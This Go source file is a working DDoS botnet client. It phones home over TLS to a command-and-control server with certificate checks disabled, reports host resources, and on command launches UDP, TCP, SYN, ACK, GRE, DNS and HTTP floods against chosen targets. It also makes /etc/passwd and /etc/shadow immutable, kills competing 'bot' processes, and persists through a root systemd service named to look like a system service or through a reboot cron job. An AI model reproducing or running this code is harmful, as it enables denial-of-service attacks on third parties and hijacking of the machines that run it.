package main

import (
	"bufio"
	"context"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/miekg/dns"
	"github.com/shirou/gopsutil/mem"
)

const (
	C2Address         = "3proxy.localhost.local:7003"
	reconnectDelay    = 5 * time.Second
	heartbeatInterval = 30 * time.Second
	maxRetries        = 5
	baseRetryDelay    = 1 * time.Second
	dnsTimeout        = 5 * time.Second
	httpTimeout       = 10 * time.Second
	maxPacketSize     = 65535
	minSourcePort     = 1024
	maxSourcePort     = 65535
)

var (
	stopChan    = make(chan struct{})
	statsMutex  sync.Mutex
	globalStats = make(map[string]*AttackStats)
	randMu      sync.Mutex
)

type AttackStats struct {
	PacketsSent  int64
	RequestsSent int64
	Errors       int64
	StartTime    time.Time
	Duration     time.Duration
}

func main() {
	rand.Seed(time.Now().UnixNano())
	attempt := 0

	for {
		conn, err := connectToC2()
		if err != nil {
			attempt++
			delay := time.Duration(attempt*attempt) * baseRetryDelay
			if delay > 30*time.Second {
				delay = 30 * time.Second
			}
			log.Printf("Connection failed (attempt %d): %v, retrying in %v", attempt, err, delay)
			time.Sleep(delay)
			continue
		}
		attempt = 0

		if err := handleChallenge(conn); err != nil {
			log.Printf("Challenge failed: %v", err)
			conn.Close()
			time.Sleep(reconnectDelay)
			continue
		}

		if err := runBot(conn); err != nil {
			log.Printf("Bot error: %v", err)
			conn.Close()
			time.Sleep(reconnectDelay)
		}
	}
}

func connectToC2() (net.Conn, error) {
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS12,
	}

	dialer := &net.Dialer{
		Timeout:   10 * time.Second,
		KeepAlive: 30 * time.Second,
	}

	conn, err := tls.DialWithDialer(dialer, "tcp", C2Address, tlsConfig)
	if err != nil {
		return nil, fmt.Errorf("connection failed: %w", err)
	}

	tcpConn, ok := conn.NetConn().(*net.TCPConn)
	if !ok {
		conn.Close()
		return nil, fmt.Errorf("could not get TCP connection")
	}

	tcpConn.SetKeepAlive(true)
	tcpConn.SetKeepAlivePeriod(30 * time.Second)

	return conn, nil
}

func runBot(conn net.Conn) error {
	defer conn.Close()

	cores := runtime.NumCPU()
	ramGB := getRAMGB()
	_, err := conn.Write([]byte(fmt.Sprintf("PONG:%s:%d:%.1f\n", runtime.GOARCH, cores, ramGB)))
	if err != nil {
		return fmt.Errorf("initial info send failed: %w", err)
	}

	cmdChan := make(chan string)
	defer close(cmdChan)

	go func() {
		scanner := bufio.NewScanner(conn)
		for scanner.Scan() {
			cmdChan <- scanner.Text()
		}
	}()

	heartbeatDone := make(chan struct{})
	go func() {
		sendHeartbeat(conn, cores, ramGB)
		close(heartbeatDone)
	}()

	for {
		select {
		case command := <-cmdChan:
			if err := handleCommand(command); err != nil {
				log.Printf("Command error: %v", err)
			}
		case <-heartbeatDone:
			return nil
		case <-time.After(30 * time.Second):
			return nil
		}
	}
}

func handleChallenge(conn net.Conn) error {
	reader := bufio.NewReader(conn)
	challengeLine, err := reader.ReadString('\n')
	if err != nil {
		return fmt.Errorf("read challenge failed: %w", err)
	}

	challenge := strings.TrimPrefix(strings.TrimSpace(challengeLine), "CHALLENGE:")
	response := computeResponse(challenge)

	_, err = conn.Write([]byte(response + "\n"))
	return err
}

func computeResponse(challenge string) string {
	// Get the salt from the challenge (assuming challenge format is "challenge:salt")
	parts := strings.Split(challenge, ":")
	if len(parts) < 2 {
		hash := sha256.Sum256([]byte(challenge + "SALT"))
		return hex.EncodeToString(hash[:])
	}
	hash := sha256.Sum256([]byte(parts[0] + parts[1]))
	return hex.EncodeToString(hash[:])
}

func sendHeartbeat(conn net.Conn, cores int, ramGB float64) {
	ticker := time.NewTicker(heartbeatInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			statsMutex.Lock()
			activeAttacks := len(globalStats)
			statsMutex.Unlock()

			conn.Write([]byte(fmt.Sprintf("HEARTBEAT:%s:%d:%.1f:%d\n",
				runtime.GOARCH, cores, ramGB, activeAttacks)))
		case <-stopChan:
			return
		}
	}
}

func getRAMGB() float64 {
	mem, err := mem.VirtualMemory()
	if err != nil {
		return 0
	}
	return float64(mem.Total) / (1024 * 1024 * 1024)
}

func handleCommand(command string) error {
	fields := strings.Fields(command)
	if len(fields) == 0 {
		return nil
	}

	if len(fields) < 1 {
		return fmt.Errorf("empty command")
	}

	switch fields[0] {
	case "PING":
		return nil
	case "STOP":
		stopAllAttacks()
		return nil
	case "kill":
		return executeKiller()
	case "update":
		return executeUpdate()
	case "lock":
		return executeLocker()
	case "persist":
		return setupPersistence()
	case "!udpflood", "!udpsmart", "!tcpflood", "!synflood", "!ackflood", "!greflood", "!dns", "!http":
		if len(fields) != 4 {
			return fmt.Errorf("invalid command format")
		}

		target := fields[1]
		targetPort, err := strconv.Atoi(fields[2])
		if err != nil {
			return fmt.Errorf("invalid port number")
		}

		duration, err := strconv.Atoi(fields[3])
		if err != nil {
			return fmt.Errorf("invalid duration")
		}

		if net.ParseIP(target) == nil {
			if _, err := net.LookupHost(target); err != nil {
				return fmt.Errorf("invalid target")
			}
		}

		if targetPort <= 0 || targetPort > 65535 {
			return fmt.Errorf("invalid port")
		}

		if duration <= 0 || duration > 300 {
			return fmt.Errorf("invalid duration")
		}

		switch fields[0] {
		case "!udpflood":
			go performUDPFlood(target, targetPort, duration)
		case "!udpsmart":
			go performSmartUDP(target, targetPort, duration)
		case "!tcpflood":
			go performTCPFlood(target, targetPort, duration)
		case "!synflood":
			go performSYNFlood(target, targetPort, duration)
		case "!ackflood":
			go performACKFlood(target, targetPort, duration)
		case "!greflood":
			go performGREFlood(target, duration)
		case "!dns":
			if targetPort != 53 {
				return fmt.Errorf("DNS attacks must target port 53")
			}
			go performDNSFlood(target, targetPort, duration)
		case "!http":
			go performHTTPFlood(target, targetPort, duration)
		}
	default:
		return fmt.Errorf("unknown command")
	}

	return nil
}

func stopAllAttacks() {
	close(stopChan)
	stopChan = make(chan struct{})
}

func performUDPFlood(target string, port, duration int) {
	stats := &AttackStats{
		StartTime: time.Now(),
		Duration:  time.Duration(duration) * time.Second,
	}

	statsMutex.Lock()
	globalStats["udpflood"] = stats
	statsMutex.Unlock()

	defer func() {
		statsMutex.Lock()
		delete(globalStats, "udpflood")
		statsMutex.Unlock()
	}()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	// Pre-generate random payloads to reduce lock contention
	payloads := make([][]byte, 100)
	for i := range payloads {
		size := getRandomInt(512, 2048)
		payloads[i] = make([]byte, size)
		rand.Read(payloads[i])
	}

	var wg sync.WaitGroup
	workers := calculateWorkers()

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			// Create connection with random source port
			localAddr := &net.UDPAddr{IP: net.IPv4zero, Port: getRandomPort()}
			remoteAddr := &net.UDPAddr{IP: net.ParseIP(target), Port: port}

			conn, err := net.DialUDP("udp", localAddr, remoteAddr)
			if err != nil {
				return
			}
			defer conn.Close()

			// Batch writes for better performance
			batchSize := 5
			payloadIndex := 0

			for {
				select {
				case <-ctx.Done():
					return
				case <-stopChan:
					return
				default:
					// Cycle through pre-generated payloads
					payload := payloads[payloadIndex]
					payloadIndex = (payloadIndex + 1) % len(payloads)

					// Send multiple packets per write when possible
					for j := 0; j < batchSize; j++ {
						_, err := conn.Write(payload)
						if err != nil {
							atomic.AddInt64(&stats.Errors, 1)
							break // Exit batch on error
						} else {
							atomic.AddInt64(&stats.PacketsSent, 1)
						}
					}
				}
			}
		}()
	}
	wg.Wait()
}

func performSmartUDP(target string, port, duration int) {
	stats := &AttackStats{
		StartTime: time.Now(),
		Duration:  time.Duration(duration) * time.Second,
	}

	statsMutex.Lock()
	globalStats["udpsmart"] = stats
	statsMutex.Unlock()

	defer func() {
		statsMutex.Lock()
		delete(globalStats, "udpsmart")
		statsMutex.Unlock()
	}()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	var wg sync.WaitGroup
	workers := calculateWorkers()
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("udp", ":0")
			if err != nil {
				return
			}
			defer conn.Close()

			for {
				select {
				case <-ctx.Done():
					return
				case <-stopChan:
					return
				default:
					payloadSize := getRandomInt(1024, 65507)
					payload := make([]byte, payloadSize)
					randMu.Lock()
					rand.Read(payload)
					randMu.Unlock()

					_, err := conn.WriteTo(payload, &net.UDPAddr{
						IP:   net.ParseIP(target),
						Port: port,
					})

					if err != nil {
						atomic.AddInt64(&stats.Errors, 1)
					} else {
						atomic.AddInt64(&stats.PacketsSent, 1)
					}
				}
			}
		}()
	}
	wg.Wait()
}

func performTCPFlood(target string, port, duration int) {
	stats := &AttackStats{
		StartTime: time.Now(),
		Duration:  time.Duration(duration) * time.Second,
	}

	statsMutex.Lock()
	globalStats["tcpflood"] = stats
	statsMutex.Unlock()

	defer func() {
		statsMutex.Lock()
		delete(globalStats, "tcpflood")
		statsMutex.Unlock()
	}()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	// Pre-generate various payload sizes and contents
	payloads := make([][]byte, 10)
	for i := range payloads {
		size := getRandomInt(512, 4096) // Larger payload range
		payloads[i] = make([]byte, size)
		rand.Read(payloads[i])
	}

	var wg sync.WaitGroup
	workers := calculateWorkers() * 2 // Double the workers for TCP
	sourcePorts := make(chan int, workers)
	for i := 0; i < workers; i++ {
		sourcePorts <- getRandomPort()
	}

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			srcPort := <-sourcePorts
			defer func() { sourcePorts <- srcPort }()

			dialer := &net.Dialer{
				Timeout:   3 * time.Second, // Reduced timeout
				KeepAlive: 0,
				LocalAddr: &net.TCPAddr{
					IP:   net.IPv4zero,
					Port: srcPort,
				},
			}

			payloadIndex := 0
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopChan:
					return
				default:
					conn, err := dialer.Dial("tcp", fmt.Sprintf("%s:%d", target, port))
					if err != nil {
						atomic.AddInt64(&stats.Errors, 1)
						time.Sleep(100 * time.Millisecond) // Brief pause on error
						continue
					}

					// Cycle through pre-generated payloads
					payload := payloads[payloadIndex]
					payloadIndex = (payloadIndex + 1) % len(payloads)

					// Send multiple writes per connection
					for j := 0; j < 3; j++ { // Send 3 payloads per connection
						_, err = conn.Write(payload)
						if err != nil {
							atomic.AddInt64(&stats.Errors, 1)
							break
						} else {
							atomic.AddInt64(&stats.PacketsSent, 1)
						}
					}

					// Enable TCP_NODELAY for faster transmission
					if tcpConn, ok := conn.(*net.TCPConn); ok {
						tcpConn.SetNoDelay(true)
					}

					conn.Close()
				}
			}
		}()
	}
	wg.Wait()
}

func performSYNFlood(target string, port, duration int) {
	stats := &AttackStats{
		StartTime: time.Now(),
		Duration:  time.Duration(duration) * time.Second,
	}

	statsMutex.Lock()
	globalStats["synflood"] = stats
	statsMutex.Unlock()

	defer func() {
		statsMutex.Lock()
		delete(globalStats, "synflood")
		statsMutex.Unlock()
	}()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	var wg sync.WaitGroup
	workers := calculateWorkers()
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				return
			}
			defer conn.Close()

			for {
				select {
				case <-ctx.Done():
					return
				case <-stopChan:
					return
				default:
					tcpLayer := &layers.TCP{
						SrcPort: layers.TCPPort(getRandomPort()),
						DstPort: layers.TCPPort(port),
						SYN:     true,
						Window:  65535,
						Seq:     rand.Uint32(),
					}

					buf := gopacket.NewSerializeBuffer()
					opts := gopacket.SerializeOptions{
						FixLengths:       true,
						ComputeChecksums: true,
					}

					if err := gopacket.SerializeLayers(buf, opts, tcpLayer); err != nil {
						atomic.AddInt64(&stats.Errors, 1)
						continue
					}

					_, err := conn.WriteTo(buf.Bytes(), &net.IPAddr{IP: net.ParseIP(target)})
					if err != nil {
						atomic.AddInt64(&stats.Errors, 1)
					} else {
						atomic.AddInt64(&stats.PacketsSent, 1)
					}
				}
			}
		}()
	}
	wg.Wait()
}

func performACKFlood(target string, port, duration int) {
	stats := &AttackStats{
		StartTime: time.Now(),
		Duration:  time.Duration(duration) * time.Second,
	}

	statsMutex.Lock()
	globalStats["ackflood"] = stats
	statsMutex.Unlock()

	defer func() {
		statsMutex.Lock()
		delete(globalStats, "ackflood")
		statsMutex.Unlock()
	}()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	var wg sync.WaitGroup
	workers := calculateWorkers()
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				return
			}
			defer conn.Close()

			for {
				select {
				case <-ctx.Done():
					return
				case <-stopChan:
					return
				default:
					tcpLayer := &layers.TCP{
						SrcPort: layers.TCPPort(getRandomPort()),
						DstPort: layers.TCPPort(port),
						ACK:     true,
						Window:  65535,
						Seq:     rand.Uint32(),
					}

					buf := gopacket.NewSerializeBuffer()
					opts := gopacket.SerializeOptions{
						FixLengths:       true,
						ComputeChecksums: true,
					}

					if err := gopacket.SerializeLayers(buf, opts, tcpLayer); err != nil {
						atomic.AddInt64(&stats.Errors, 1)
						continue
					}

					_, err := conn.WriteTo(buf.Bytes(), &net.IPAddr{IP: net.ParseIP(target)})
					if err != nil {
						atomic.AddInt64(&stats.Errors, 1)
					} else {
						atomic.AddInt64(&stats.PacketsSent, 1)
					}
				}
			}
		}()
	}
	wg.Wait()
}

func performGREFlood(target string, duration int) {
	stats := &AttackStats{
		StartTime: time.Now(),
		Duration:  time.Duration(duration) * time.Second,
	}

	statsMutex.Lock()
	globalStats["greflood"] = stats
	statsMutex.Unlock()

	defer func() {
		statsMutex.Lock()
		delete(globalStats, "greflood")
		statsMutex.Unlock()
	}()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	var wg sync.WaitGroup
	workers := calculateWorkers()
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:gre", "0.0.0.0")
			if err != nil {
				return
			}
			defer conn.Close()

			for {
				select {
				case <-ctx.Done():
					return
				case <-stopChan:
					return
				default:
					greLayer := &layers.GRE{}

					buf := gopacket.NewSerializeBuffer()
					opts := gopacket.SerializeOptions{
						FixLengths:       true,
						ComputeChecksums: true,
					}

					if err := gopacket.SerializeLayers(buf, opts, greLayer); err != nil {
						atomic.AddInt64(&stats.Errors, 1)
						continue
					}

					_, err := conn.WriteTo(buf.Bytes(), &net.IPAddr{IP: net.ParseIP(target)})
					if err != nil {
						atomic.AddInt64(&stats.Errors, 1)
					} else {
						atomic.AddInt64(&stats.PacketsSent, 1)
					}
				}
			}
		}()
	}
	wg.Wait()
}

func performDNSFlood(target string, port, duration int) {
	stats := &AttackStats{
		StartTime: time.Now(),
		Duration:  time.Duration(duration) * time.Second,
	}

	statsMutex.Lock()
	globalStats["dnsflood"] = stats
	statsMutex.Unlock()

	defer func() {
		statsMutex.Lock()
		delete(globalStats, "dnsflood")
		statsMutex.Unlock()
	}()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	var wg sync.WaitGroup
	workers := calculateWorkers()
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("udp", ":0")
			if err != nil {
				return
			}
			defer conn.Close()

			for {
				select {
				case <-ctx.Done():
					return
				case <-stopChan:
					return
				default:
					domain := getRandomDomain()
					query := constructDNSQuery(domain)
					msg, err := query.Pack()
					if err != nil {
						atomic.AddInt64(&stats.Errors, 1)
						continue
					}

					_, err = conn.WriteTo(msg, &net.UDPAddr{
						IP:   net.ParseIP(target),
						Port: port,
					})

					if err != nil {
						atomic.AddInt64(&stats.Errors, 1)
					} else {
						atomic.AddInt64(&stats.PacketsSent, 1)
					}
				}
			}
		}()
	}
	wg.Wait()
}

func constructDNSQuery(domain string) *dns.Msg {
	msg := new(dns.Msg)
	msg.SetQuestion(dns.Fqdn(domain), dns.TypeA)
	msg.RecursionDesired = true
	msg.SetEdns0(4096, false)
	return msg
}

func performHTTPFlood(target string, port, duration int) {
	stats := &AttackStats{
		StartTime: time.Now(),
		Duration:  time.Duration(duration) * time.Second,
	}

	statsMutex.Lock()
	globalStats["httpflood"] = stats
	statsMutex.Unlock()

	defer func() {
		statsMutex.Lock()
		delete(globalStats, "httpflood")
		statsMutex.Unlock()
	}()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	client := &http.Client{
		Timeout:   httpTimeout,
		Transport: &http.Transport{DisableKeepAlives: true},
	}

	var wg sync.WaitGroup
	workers := calculateWorkers()
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopChan:
					return
				default:
					if err := sendHTTPRequest(client, target, port); err != nil {
						atomic.AddInt64(&stats.Errors, 1)
					} else {
						atomic.AddInt64(&stats.RequestsSent, 1)
					}
				}
			}
		}()
	}
	wg.Wait()
}

func sendHTTPRequest(client *http.Client, target string, port int) error {
	url := fmt.Sprintf("http://%s:%d", target, port)
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return err
	}

	req.Header.Set("User-Agent", getRandomUserAgent())
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Connection", "close")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Pragma", "no-cache")

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	return nil
}

func executeKiller() error {
	cmd := exec.Command("sh", "-c", "pkill -9 -f bot")
	return cmd.Run()
}

func executeUpdate() error {
	exePath, err := os.Executable()
	if err != nil {
		return err
	}

	cmd := exec.Command(exePath, "--update")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	return cmd.Run()
}

func executeLocker() error {
	cmd := exec.Command("sh", "-c", "chattr +i /etc/passwd /etc/shadow")
	return cmd.Run()
}

func setupPersistence() error {
	exePath, err := os.Executable()
	if err != nil {
		return err
	}

	if err := createSystemdService(exePath); err == nil {
		return nil
	}

	return createCronJob(exePath)
}

func createSystemdService(exePath string) error {
	serviceContent := fmt.Sprintf(`[Unit]
Description=System Service
After=network.target

[Service]
ExecStart=%s
Restart=always
User=root

[Install]
WantedBy=multi-user.target`, exePath)

	servicePath := "/etc/systemd/system/system-service.service"
	if err := os.WriteFile(servicePath, []byte(serviceContent), 0644); err != nil {
		return err
	}

	cmd := exec.Command("systemctl", "enable", "--now", "system-service.service")
	return cmd.Run()
}

func createCronJob(exePath string) error {
	cronJob := fmt.Sprintf("@reboot %s > /dev/null 2>&1", exePath)
	cmd := exec.Command("sh", "-c", fmt.Sprintf("(crontab -l; echo '%s') | crontab -", cronJob))
	return cmd.Run()
}

func calculateWorkers() int {
	mem, err := mem.VirtualMemory()
	if err != nil {
		return 512
	}
	cores := runtime.NumCPU()
	availableMB := mem.Available / 1024 / 1024

	workersPerCore := 256
	if availableMB < 1024 {
		workersPerCore = 64
	} else if availableMB < 2048 {
		workersPerCore = 128
	}

	return cores * workersPerCore
}

func getRandomPort() int {
	randMu.Lock()
	defer randMu.Unlock()
	return rand.Intn(maxSourcePort-minSourcePort) + minSourcePort
}

func getRandomInt(min, max int) int {
	randMu.Lock()
	defer randMu.Unlock()
	return rand.Intn(max-min) + min
}

func getRandomDomain() string {
	domains := []string{
		"google.com", "youtube.com", "facebook.com",
		"baidu.com", "wikipedia.org", "reddit.com",
		"yahoo.com", "amazon.com", "twitter.com",
	}
	randMu.Lock()
	defer randMu.Unlock()
	return domains[rand.Intn(len(domains))]
}

func getRandomUserAgent() string {
	agents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
		"Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
	}
	randMu.Lock()
	defer randMu.Unlock()
	return agents[rand.Intn(len(agents))]
}
